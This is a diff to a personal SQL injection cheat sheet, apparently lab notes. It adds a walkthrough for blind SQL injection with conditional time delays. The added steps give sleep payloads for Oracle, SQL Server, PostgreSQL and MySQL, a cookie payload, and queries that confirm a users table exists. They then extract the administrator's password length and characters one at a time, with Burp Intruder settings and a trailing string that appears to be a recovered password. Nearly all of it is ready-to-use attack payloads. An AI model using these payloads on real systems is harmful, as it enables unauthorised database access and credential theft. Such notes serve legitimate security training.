@@ -241,10 +241,10 @@ c. Out-of-band:
         ' || (select TO_CHAR(1/0) FROM users WHERE username='administrator' and SUBSTR(password,1,1)='a')|| ' 
 
 
+***** Blind SQLI with conditional time delays *****
 
-
-***** Blind SQLI with time delays *****
-
+1. Confirm that the paramter is vulnerable to SQL Injection.
+ 
         Oracle       :  dbms_pipe.receive_message(('a'),10)
         Microsoft    :  WAITFOR DELAY '0:0:10'
         PostgreSQL   :  SELECT pg_sleep(10)
@@ -261,8 +261,31 @@ c. Out-of-band:
         ");waitfor delay '0:0:10'--
         ));waitfor delay '0:0:10'--
 
+        Payload on cookie: ' || pg_sleep(10)--
+
+2. Confirm that the users table exists in database.
+
+        Oracle       :	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
+        Microsoft    : 	IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'
+        PostgreSQL   : 	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END
+        MySQL 	     :  SELECT IF(YOUR-CONDITION-HERE,sleep(10),'a') 
 
 
+        ' || (select case when (1=1) then pg_sleep(10) else pg_sleep(-1) end)--
 
-***** Blind SQLI with conditional time delays *****
+        ' || (select case when (username='administrator') then pg_sleep(10) else pg_sleep(-1) end from users)--
 
+3. ENumerate the password length
+
+        ' || (select case when (username='administrator' and LENGTH(password)>1) then pg_sleep(10) else pg_sleep(-1) end from users)--
+
+        * resource pool custom: 1 or options: request engine(no. of threads=1) 
+        At length 19 slept and on 20 not slept. so length=20
+
+4. Enumerate administrator password
+
+        ' || (select case when (username='administrator' and substring(password,1,1)='a') then pg_sleep(10) else pg_sleep(-1) end from users)--
+
+        * resource pool custom: 1 or options: request engine(no. of threads=1) 
+
+  gyftm8e4w60ujeaex093
